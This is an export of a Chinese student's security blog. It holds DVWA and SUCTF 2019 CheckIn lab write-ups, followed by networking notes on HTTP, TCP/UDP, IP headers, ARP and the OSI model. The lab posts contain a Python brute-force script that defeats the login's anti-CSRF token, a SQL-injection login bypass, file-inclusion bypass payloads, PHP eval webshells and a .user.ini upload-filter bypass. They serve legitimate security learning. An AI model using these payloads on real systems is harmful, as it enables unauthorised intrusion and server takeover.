[{"title":"DVWA1.1 Brute Force & burpsuite 使用","date":"2020-05-07T12:19:40.000Z","path":"2020/05/07/DVWA1-1-Brute-Force-burpsuite-使用/","text":"学习的博客:https://blog.csdn.net/he_and/article/details/80063315(dvwa brute force(暴力破解))https://www.freebuf.com/articles/web/116437.html(新手指南：DVWA-1.9全级别教程之Brute Force)https://blog.csdn.net/qq_36119192/article/details/82938424?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromBaidu-1(DVWA之Brute Force) low源代码: 1234567891011121314151617181920212223242526272829303132&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful $html .= \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; $html .= \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed $html .= \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;?&gt; 先抓包，发送到intruder模块 选定爆破位置，设置有效载荷 开始攻击 由于代码中没有做sql注入防护，所以也可以手工注入输入Username: admin ‘ #Password: (空) medium源代码 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check the database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful $html .= \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; $html .= \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed sleep( 2 ); $html .= \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;?&gt; mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。connection 必需。规定要使用的 MySQL 连接。escapestring 必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\\n、\\r、\\、’、” 和 Control-Z。 由于使用mysqli_real_escape_string()函数转义了字符串中的特殊字符，还对password进行md5校验，基本防护住了sql注入，虽然在login failed处多加了一条sleep语句，但是没有有效防护暴力破解，所以仍然可以用burp suite进行爆破，爆破方法跟low基本一样 high源代码 12345678910111213141516171819202122232425262728293031323334353637383940414243&lt;?phpif( isset( $_GET[ 'Login' ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $user ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\"___mysqli_ston\"]) &amp;&amp; is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_real_escape_string($GLOBALS[\"___mysqli_ston\"], $pass ) : ((trigger_error(\"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\", E_USER_ERROR)) ? \"\" : \"\")); $pass = md5( $pass ); // Check database $query = \"SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\"; $result = mysqli_query($GLOBALS[\"___mysqli_ston\"], $query ) or die( '&lt;pre&gt;' . ((is_object($GLOBALS[\"___mysqli_ston\"])) ? mysqli_error($GLOBALS[\"___mysqli_ston\"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '&lt;/pre&gt;' ); if( $result &amp;&amp; mysqli_num_rows( $result ) == 1 ) &#123; // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\"avatar\"]; // Login successful $html .= \"&lt;p&gt;Welcome to the password protected area &#123;$user&#125;&lt;/p&gt;\"; $html .= \"&lt;img src=\\\"&#123;$avatar&#125;\\\" /&gt;\"; &#125; else &#123; // Login failed sleep( rand( 0, 3 ) ); $html .= \"&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;\"; &#125; ((is_null($___mysqli_res = mysqli_close($GLOBALS[\"___mysqli_ston\"]))) ? false : $___mysqli_res);&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; stripslashes(string)： 去除掉string字符的反斜杠＼mysqli_real_escape_string(string,connection) ：函数会对字符串string中的特殊符号（\\x00，\\n，\\r，\\，‘，“，\\x1a）进行转义。$GLOBALS ：引用全局作用域中可用的全部变量。$GLOBALS 这种全局变量用于在 PHP 脚本中的任意位置访问全局变量（从函数或方法中均可）。PHP 在名为 $GLOBALS[index] 的数组中存储了所有全局变量。变量的名字就是数组的键。 由于使用了Anti-CSRF token，每次服务器返回的登录页面都会包含一个随机的user_token。这个user_token是随机的，所以不能通过burpsuite进行爆破。可以通过python脚本进行爆破 vscode python安装扩展 pip 更新 C:\\Users\\Dell\\AppData\\Local\\Programs\\Python\\Python38-32&gt; ./python -m pip install –upgrade pip 安装bs4 C:\\Users\\Dell\\AppData\\Local\\Programs\\Python\\Python38-32&gt; ./python -m pip install bs4 安装requestsC:\\Users\\Dell\\AppData\\Local\\Programs\\Python\\Python38-32&gt; ./python -m pip install requests 12345678910111213141516171819202122232425262728293031323334from bs4 import BeautifulSoupimport requestsheader = &#123; 'Host':'192.168.0.107', 'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0', 'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', 'Accept-Language' : 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Accept-Language' : 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2', 'Connection' : 'close', 'Referer' : 'http://192.168.0.107/dvwa-master/vulnerabilities/brute/', 'Cookie' : 'security=high; PHPSESSID=8b9c4d6jp15hav6tp3cf6168vu', 'Upgrade-Insecure-Requests' : '1'&#125;requrl = 'http://192.168.0.107/dvwa-master/vulnerabilities/brute/'def get_token(requrl, header): response = requests.get(url=requrl, headers=header) print(response.status_code, len(response.content)) soup = BeautifulSoup(response.text, \"html.parser\") input = soup.form.select(\"input[type='hidden']\") user_token = input[0]['value'] return user_tokenuser_token = get_token(requrl, header)i = 0for line in open(\"F:\\Desktop\\Temporary_Files\\password.txt\"): requrl = \"http://192.168.0.107/dvwa-master/vulnerabilities/brute/?username=admin&amp;password=\"+line.strip()+\"&amp;Login=Login&amp;user_token=\"+user_token i = i + 1 print(i, 'admin', line.strip(), end=\" \") user_token = get_token(requrl, header) if (i == 10): break python脚本中一些方法的解释:学习的博客:https://blog.csdn.net/k_koris/article/details/82950654(python request库) Request库的get()方法最通常的方法是通过__r = request.get(url)构造一个向服务器请求资源的url对象。这个对象是Request库内部生成的。这时候的r返回的是一个包含服务器资源的Response对象。包含服务器返回的所有的相关资源。 Response对象的属性属性————————————————说明r.status_code——————HTTP请求的返回状态，200表示连接成功，404表示失败r.text—————————————HTTP响应内容的字符串形式，即url对应的页面内容r.encoding—————————从HTTP header中猜测响应内容的编码方式r.apparent_encoding—从内容中分析出的响应内容的编码方式(备选编码方式)r.content——————————HTTP响应内容的二进制形式 注意: 如果header中不存在charset，则认为编码为ISO-8859-1 BeautifulSoup(response.text, “html.parser”)其中”html.parser”是bs4库的解析器bs4库有四种解析器解析器——————————————使用方法——————————————————————————————条件bs4的HTML解析器—————BeautifulSoup(mk, ‘html.parser’)—————安装bs4库lxml的HTML解析器————BeautifulSoup(mk, ‘lxml’)————————————pip install lxmllxml的XML解析器—————BeautifulSoup(mk, ‘xml’)—————————————pip install lxmlhtml5lib的解析器————BeautifulSoup(mk, ‘html5lib’)————————pip install html5lib soup.form.select(“input[type=’hidden’]”)是获取token的标签 python脚本运行结果:![image][tmp8] 爆破成功","tags":[]},{"title":"DVWA1.1 File Inclusion","date":"2020-05-06T13:20:09.000Z","path":"2020/05/06/DVWA1-1-File-Inclusion/","text":"学习的博客:https://www.cnblogs.com/-an-/p/12371449.html low源代码 123456&lt;?php// The page we wish to display$file = $_GET[ 'page' ];?&gt; 源代码非常简单，找源码的过程中发现还有个file4.php，可以直接读取看看http://192.168.43.199/dvwa-master/vulnerabilities/fi/?page=file4.php medium源代码 12345678910&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validation$file = str_replace( array( \"http://\", \"https://\" ), \"\", $file );$file = str_replace( array( \"../\", \"..\\\"\" ), \"\", $file );?&gt; 只要page=后面存在下面的http://、https://、../、..\\就会将其替换为空。 str_replace函数的作用是在相应字符串中查找目标字符，然后将其替换为规定的字符，但是它只会查找一次，不会多次查找，所以使用双写以及大小写就能绕过这个函数。http://192.168.43.199/dvwa-master/vulnerabilities/fi/?page=hthttp://tp://192.168.43.199/test/test1.php test1.php是本地测试随便写的一个php文件 high源代码 12345678910111213&lt;?php// The page we wish to display$file = $_GET[ 'page' ];// Input validationif( !fnmatch( \"file*\", $file ) &amp;&amp; $file != \"include.php\" ) &#123; // This isn't the page we want! echo \"ERROR: File not found!\"; exit;&#125;?&gt; fnmatch函数这里的作用是判断$file中必须是file开头 file协议 1234PHP.ini：file:// 协议在双off的情况下也可以正常使用；allow_url_fopen ：off/onallow_url_include：off/on file:// 用于访问本地文件系统，在CTF中通常用来读取本地文件的且不受allow_url_fopen与allow_url_include的影响 http://192.168.43.199/dvwa-master/vulnerabilities/fi/?page=file://C:\\Users\\Dell\\Desktop\\Pwn.Web\\pwn工具.txt使用这个payload可以访问我的桌面上的pwn工具.txt","tags":[]},{"title":"[SUCTF 2019]CheckIn & DVWA1.1 File upload","date":"2020-05-06T07:33:36.000Z","path":"2020/05/06/SUCTF-2019-CheckIn-DVWA1-1-File-upload/","text":"SUCTF 2019 CheckIn 复现学习的博客:https://www.jianshu.com/p/2907426b4a91([SUCTF 2019]CheckIn)https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html(.user.ini介绍) 首先了解什么是.user.ini .user.ini是一个可以由用户”自定义”的php.ini，我们能够自定义的设置是模式为”PHP_INI_PERDIR”和”PHP_INI_USER”的设置。实际上除了PHP_INI_SYSTEM以外的模式(包括PHP_INI_ALL)都是可以通过.user.ini来设置的。和php.ini不同的是，.user.ini是一个能被动态加载的ini文件。也就是说如果修改了.user.ini后，不需要重启服务器中间件，只需要等待user_ini.cache_ttl所设置的时间(默认为300秒),即可被重新加载 在本题中可以借助.user.ini文件来构造一个后门 其中auto_append_file与auto_prepend_file的作用分别是:auto_prepend_file: 指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。auto_append_file: 只在文件后包含 使用方法只需要直接写入.user.ini文件中即可 1auto_prepend_file=01.gif 01.gif是要包含的文件可以借助.user.ini轻松让所有的php文件都”自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一句话的webshell。 利用.user.ini文件来解题 要利用.user.ini来解题需要满足三个条件：1. 服务器脚本语言为PHP2. 对应目录下有可执行的php文件3. 服务器使用CGI/FastCGI模式 首先创建一个.user.ini文件，在每个php文件被执行前都包含a.jpg 12GIF89aauto_prepend_file=a.jpg GIF89a的作用是绕过文件头校验 再创建a.jpg，内容是一句话木马 12GIF89a&lt;script language=\"php\"&gt; @eval($_POST['pass']) &lt;/script&gt; 试图上传&lt;?php @eval($_POST[‘pass’]) 发现&lt;?被过滤了，所以使用script标签 然后分别上传这两个文件，之后用蚁剑连接接就可以拿到flag了 DVWA1.1 File Uploads学习博客:https://www.cnblogs.com/-an-/p/12373583.html low 低级别没做任何防护，直接上传shell.php，再用蚁剑连接就行了 12345678910111213141516171819&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125;&#125;?&gt; basename函数返回路径中的文件名部分。如果可选参数suffix为空，则返回的文件名包含后缀名，反之不包含后缀名。 shell.php 123&lt;?php@eval($_POST['pass'])?&gt; medium 源代码 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_type = $_FILES[ 'uploaded' ][ 'type' ]; $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; // Is it an image? if( ( $uploaded_type == \"image/jpeg\" || $uploaded_type == \"image/png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $_FILES[ 'uploaded' ][ 'tmp_name' ], $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; medium级别的限制了上传的文件后缀名只能是图片类型可以将shell.php重命名为shell.png，之后再用burpsuite抓包改为shell.php发送即可也可以上传shell.php之后再用burpsuite抓包改content/type为image/png high 1234567891011121314151617181920212223242526272829303132333435&lt;?phpif( isset( $_POST[ 'Upload' ] ) ) &#123; // Where are we going to be writing to? $target_path = DVWA_WEB_PAGE_TO_ROOT . \"hackable/uploads/\"; $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] ); // File information $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ]; $uploaded_ext = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ]; $uploaded_tmp = $_FILES[ 'uploaded' ][ 'tmp_name' ]; // Is it an image? if( ( strtolower( $uploaded_ext ) == \"jpg\" || strtolower( $uploaded_ext ) == \"jpeg\" || strtolower( $uploaded_ext ) == \"png\" ) &amp;&amp; ( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp ) ) &#123; // Can we move the file to the upload folder? if( !move_uploaded_file( $uploaded_tmp, $target_path ) ) &#123; // No $html .= '&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;'; &#125; else &#123; // Yes! $html .= \"&lt;pre&gt;&#123;$target_path&#125; succesfully uploaded!&lt;/pre&gt;\"; &#125; &#125; else &#123; // Invalid file $html .= '&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;'; &#125;&#125;?&gt; strrpos函数查找字符串在另一字符串中最后一次出现的位置（区分大小写）；substr函数返回字符串的一部分。 strtolower函数将所有字符转换为小写；getimagesize函数用于获取图像的大小及相关信息。 1substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1); 上述语句的作用是只验证最后的.png，而不管前面写了多少，可以考虑%00接断，但是需要PHP&lt;5.3.4，本地的PHP版本为7.3.4，所以考虑别的方法 考虑使用上传图片木马的方法，在命令行使用 copy 命令将一句话木马写到图片中，之后再上传，再利用file协议进行包含时，文件会以php的形式执行并返回，这样就可以执行任意命令了 emmm，实际上传的时候不需要将一句话木马写入图片中上传，直接将php文件后缀改成png，再在文件头部加上一个GIF89a，也能通过文件头校验，上传成功 另外不知道为什么图片马上传成功后蚁剑连接不上…","tags":[]},{"title":"理解HTTP协议","date":"2020-05-03T11:43:13.000Z","path":"2020/05/03/理解HTTP协议/","text":"关于HTTP的无状态连接HTTP1.0版本是一个无状态连接的，而1.1版本支持状态连接，所谓无状态连接就是指：在HTTP1.0版本中一个HTTP的请求与一个HTTP的回应就叫做一个完整的HTTP连接，基于这个连接的数据一旦发送完成后，这个连接就断开，同时切断TCP的连接。如果需要重新连接，那就需要重新进行TCP三次握手，所以说HTTP1.0本身是一个无状态连接的协议，这种无状态的连接方式没有效率。 HTTP1.1版本增加了keepalive消息，使其变得有具备状态连接的特性，Keepalive的特性是提高HTTP的连接的利用率，它不会切断TCP连接，可以开始新的连接。 关于HTTP的请求报文与应答报文的结构HTTP的请求报文结构 HTTP版本号————HTTP方法————URL————请求头————实体头 HTTP版本号: 申明HTTP的版本号，1.1或1.0。 HTTP方法: 最常用的有GET、POST、REQUEST URL: 被请求页面的网址 请求头: 被请求的文件类型，*/*代表可以接受所有类型的文件 实体头: 包含被请求实体的原信息。实体的编码类型。 HTTP的响应报文结构 HTTP版本号————状态码————响应头————实体头————内容 HTTP版本号: 申明HTTP版本号，1.1或1.0 状态码: 帮助用户理解的HTTP工作状态1XX: 信息提示2XX: 成功3XX: 重定向4XX: 客户端错误5XX: 服务器错误 响应头: 响应头包括Web服务器回应给客户机的HTTP的内容是否被加密认证、是否被公开 实体头: 实体头包括HTTP响应的编码形式，语言、内容长度，以及内容的文件类型、最后一次修改的时间。","tags":[]},{"title":"理解TCP三次握手与UDP报文","date":"2020-05-03T07:32:34.000Z","path":"2020/05/03/理解TCP三次握手与UDP报文/","text":"理解TCP/IP协议的工作原理多年来TCP/IP协议一直被公众称呼为”一个协议”, 事实上它是一组协议的集合，IP工作在OSI七层模型的网络层，但是并不提供其可靠性传输控制，而TCP工作在OSI七层模型的传输层，并提供其可靠性传输控制。 可靠性传输控制是指面向连接的一种确认数据交付方式，具体的说，就是在数据传输之前，利用一种触发和认定的方式来保证发送方与接受方之间的可靠性，以防止数据在传输过程中出现丢包及其它传输不可达的现象，这好比人类世界在交换价值产品之前，必须包证接受的人能真正收到发出的产品，接受方在收到之后用一种回应的方式告知发送方，产品已经成功到达。 TCP协议的特点由于提供了面向连接的可靠交付，所以TCP协议常用于可靠性较差的网络环境中，比如internet。但是，正是由于TCP协议面向连接的可靠交付使其传输的速度较慢，至少比UDP协议慢。 TCP协议的”三次握手”TCP协议是一个相互触发、相互确认的过程。客户机要触发服务器，服务器也要触发客户机。建立握手状态的标记syn=1表示开始触发，ack=1表示对触发的回应确认。并且在TCP建立可靠连接时只会使用这两个标记。 假设有一台服务器和客户机，双方之间进行通信，需要经过TCP协议的”三次握手”原则——————syn=1, ack=0客户机————————————&gt;服务器 //客户机向服务器发送请求 ——————syn=1, ack=1客户机&lt;————————————服务器 //ack = 1表示服务器成功收到了客户机的请求，syn=1表示服务器向客户机发送请求，这两步合在一起使得TCP协议的”四次握手”变为”三次握手” ——————syn=0, ack=1客户机————————————&gt;服务器 //syn=0,ack=1表示客户机回应服务器的请求，完成TCP请求连接的三次握手 TCP的滑动窗口与确认机制在面向连接的数据传输过程中，任何数据在传递的过程中都可能损坏、丢失，或者重传，在这种情况下如果没有一种保障及hi，那么数据在传输的过程中可能导致协议出错，所以面向连接的协议提出了一种保障机制，让接受方在收到数据后进行确认。 待补充.. 理解UDP协议的工作原理UDP是用户数据包协议(User Datagram Protocol)的简称，工作在OSI七层模型的传输层，一种无连接的传输层协议，提供面向即时事务的简单不可靠信息传送服务。由于UDP的特性不属于面向连接型协议，具有资源消耗小，处理速度快的优点，所以通常语音视频和流媒体文件在传送时使用UDP较多。 UDP报文结构包含 源端口、目标端口、长度、校验和、被封装的上层数据 源端口: 指示发起UDP会话源主机所使用的端口号，通常这个端口号是一个临时随机生成的端口号。 目的端口: 指示接受UDP会话目标主机所使用的端口号，通常这个端口是一个众所周知的端口号，比如DNS（53)端口 长度：指示整个UDP报文的长度，包括UDP首部与数据部分 校验和: 这是一个可选项，它是根据整个UDP数据再加一个UDP的伪首部计算而得到的一个校验和值，这个所谓的UDP伪首部的结构如下，事实上就是取自IP首部，UDP的伪首部只在校验和计算时使用，随后就会被丢弃，并不会被真正的传输，注意UDP的校验和字段是一个可选字段，不是必须字段。———————————————————————————————————————————————————————————————源IP地址————————目标IP地址————保留——————协议—————————————长度(取自IP首部)———(取自IP首部)——————————(取自IP首部)————(取自UDP首部)———————————————————————————————————————————————————————————————— 数据: 将被UDP发送的高层报文。 注意: 当面对不可靠的网络如Internet时为了加强数据传输的可靠性，建议使用面向连接的TCP协议，当传输即使数据时，建议使用无面向连接的UDP协议，因为它有较高的传输速度。","tags":[]},{"title":"理解IP报文的结构","date":"2020-05-03T01:32:34.000Z","path":"2020/05/03/理解IP报文的结构/","text":"IP报文的结构IP报文包含20字节IP报头、选项（根据实际应用而定）字段、传递数据（用户数据）组成。其中理解20字节的IP报头部分各个字段的具体意义是理解IP报文的关键。其中包括版本、报头长度、服务类型、总长度、标识符、标志、片偏移（传输时是否发生数据分段）、生存时间、协议、首部校验和、源IP地址、目标IP地址。 IP报文中各字段解释版本(version): 该字段的长度为4比特，表示正在使用的IP协议的版本。该字段的值一般为4或6，如果该值为4表示正在使用IP的4号版本，为6的话则是6号版本。 报头长度: 长度为4比特，描述IP报头的长度，如果不携带 “选项” 字段，那么值为20字节，如果包含了”选项字段”, 那么报头长度最大可为60字节(“选项”字段最大值为40字节)。换而言之，IP报头长度的值的变化范围为20~60字节。注意: IP报头长度(Header Length)并不包括任何数据负载的大小。 服务类型(Type of Service): 长度为8比特，用于对特殊报文的处理。该字段可以配置IP报文的优先级，其意义在于当网络发生拥塞时，可让具备高优先级的IP报文优先被转发。 TOS字段用于配置传输服务类型、如吞吐量、时延、可靠性、费用等类型。 注意: 一把面向IP力量工程、服务质量包证(QOS)项目的工程师将大量配置和使用。 总长度(Total Length): 该字段为16比特，指示整个IP报文所能携带的最大字节数、包括”IP 报头”和”传递数据(负载)”长度的总和。 总长度占16位，一个IP报文的最大长度位65535个字节。 注意: IP报文通常也叫IP数据包，工作在”网络层”, 由IP报头和传递数据组成，而一个IP数据包最大不能超过65535字节。 标识符(Identifier): 该字段的长度位16比特，表示为某一种IP数据包分配一个唯一的数字标识，该标识符的作用就是保证数据被分段后，区别于网络中其它的IP数据分段，然后可以被正确的重新组合，因为在某一个IP数据被分段的同时，可能存在多个不同IP数据的分段。 注意: 标识符(Identifier)类似于将标记为红色的物品混入其它不同颜色的物品中，而此时将红色的物品分离出来就是一件很容易的事情，标识符就有这样的作用。 标志(Flags): 该字段的长度为3比特，该字段的作用主要是配合IP报文中的标识符(Identifier)字段和”片偏移(Fragment Offset)”字段来管理IP报文的分段。它由三个控制标志组成，三个标志中，第一位(也是第一个标志)一般不使用，作为预保留。第二位(也是第二个标志)为DF(Don’t fragment)位，如果DF值为1，表示不能对该IP数据包执行分段处理。低三位(也是第三个标志位)为MF(More fragment)位，表示对于被分段的IP数据包，除了最后一个数据分段的MF值为0之外，其它的所有数据分段的MF的值都为1，换而言之，MF=1表示该IP数据分段的后面还有紧跟的数据分段，直到MF值为0为止。 片偏移(Fragment Offset): 该字段长度为13比特。表示分段数据起始点相对于报头起始点的偏移位置，其目的在于让目标接受方可按照分段顺序重新组织报文，因为被分段的数据可能因为网络环境等客观因素不能按分段时的顺序到达目标接受方。 注意: 片偏移(Fragment Offset)字段类似于两个物体之间规定相隔距离为30米，那么不管把这两个物体移动到什么位置，两个物体之间的距离始终为30米，同理，偏移位置即使两个分段之间的相对位置。 生存时间(Time of Live): 该字段为8比特，表名当前报文能在网络上的最大存活时间，意思就是指数据包每经过一个路由器(网关)，TTL值自动减1，当为0时，丢弃该报文。 协议(Protocol): 该字段长度为8比特，用于表示OSI上层所携带的具体协议， 通常是一个传输层协议或者网络层协议，如: UDP、ICMP、等。通常该协议值使用十六进制表示。UDP、TCP、ICMP分别对应的十六进制值为: 11、06、01。 首部校验和(Header Checksum): 该字段长度为16比特，该字段只在IP报文的首部上进行计算，提供一种基于传输的基本差错控制。 具体做法是把IP报文的首部字节分为两个字，一个字为两个字节，然后进行相加而得到，转发IP报文的所有中间设备都要进行该值的计算，如果计算出来的两个校验和不同，就认为数据在传输的过程中被损坏。 源IP地址(Source Addresses): 该字段长度为32比特，用于记录发送数据源主机的IP地址。 目标IP地址(Destination Addresses): 该字段长度为32比特，用于记录目标主机的IP地址。 简单的ping了一下www.baidu.com观察到的ip报文的结构","tags":[]},{"title":"理解ARP、RARP、免费ARP的工作原理","date":"2020-05-02T07:35:48.000Z","path":"2020/05/02/理解ARP、RARP、免费ARP的工作原理/","text":"处于本地主机间的ARP报文之间的应答ARP: 知道目标主机的IP的地址去解析目标主机的MAC地址 假设本地中有两台主机A,B,已知A的IP为 192.168.1.1，MAC地址为 00:DC:29:7A:BC:EDB的IP为 192.168.1.2，MAC地址为 00:DC:29:00:45:FA 如果A主机不知道B主机的MAC地址，想要获得B主机的MAC地址可以发送一个ARP报文，报文结构如下:|——————————————————————————————————————————||源IP地址：目的IP地址：源MAC地址: 目的MAC地址 | + ARP消息报头|——————————————————————————————————————————|这里A构造的ARP报文可以是:|——————————————————————————————————————————————————————————————||192.168.1.1 : 192.168.1.2 : 00:DC:29:7A:BC:ED : 0000.0000.0000||——————————————————————————————————————————————————————————————|+ARP请求消息报头FFFF.FFFF.FFFF255.255.255.255 当B主机收到这个ARP报文时，发现目的IP地址是本主机时，会回发一个应答报文|——————————————————————————————————————————————————————————————————||192.168.1.2 : 192.168.1.1 : 00:DC:29:00:45:FA : 00:DC:29:7A:BC:ED ||——————————————————————————————————————————————————————————————————|+ ARP应答消息报头00:DC:29:7A:BC:ED192.168.1.1 A主机收到这个应答报文时就可以知道B主机的MAC地址了注意:ARP的请求广播只能工作在本地网络，因为它是以广播形式进行工作，所以会被路由器阻隔. RARP(Reverse Address Resolution Protocol)逆向ARP地址解析协议RARP:已知MAC地址去解析对应的IP的地址 免费的ARP免费ARP（Gratuitous ARP)是ARP协议的另一种表现形式，它的目标在于检测网络上的IP的地址冲突，无论是计算机或者路由器都用免费ARP来检测本地网络上的地址冲突。 arp请求报文的结构:","tags":[]},{"title":"理解计算机网络体系结构","date":"2020-05-02T04:57:15.000Z","path":"2020/05/02/理解计算机网络体系结构/","text":"OSI七层模型应用层表达层会话层传输层网络层数据链路层物理层 1.物理层OSI模型的最低层或叫做第一层，物理层产生并检测电压以便发送和接收携带数据的信号。物理层不提供纠错服务，但它能够依据数据传输的速率监测数据的出错率。2.数据链路层处于OSI模型的第二层，提供可靠的信息传输服务及差错控制，处于该层的数据以”帧” 形式体现。上层的数据被封装在帧体中，目标在于可靠的传输数据，在帧构造的结尾部分有一个CRC(循环冗余校验)，它是数据帧差错控制的一个关键值，其作用是，在数据链路层封装了上层数据后，会对整个数据帧进行一个CRC的校验计算，并将计算机的值附加到数据帧中，然后传递该数据帧，当数据帧到达通信目标时，接收端主机会再次计算CRC的校验值，如果此次计算的值与帧体中附加的值是一样，者就表示数据在传输的过程中没有损失，保持了完整性，也是差错控制的重要手段。 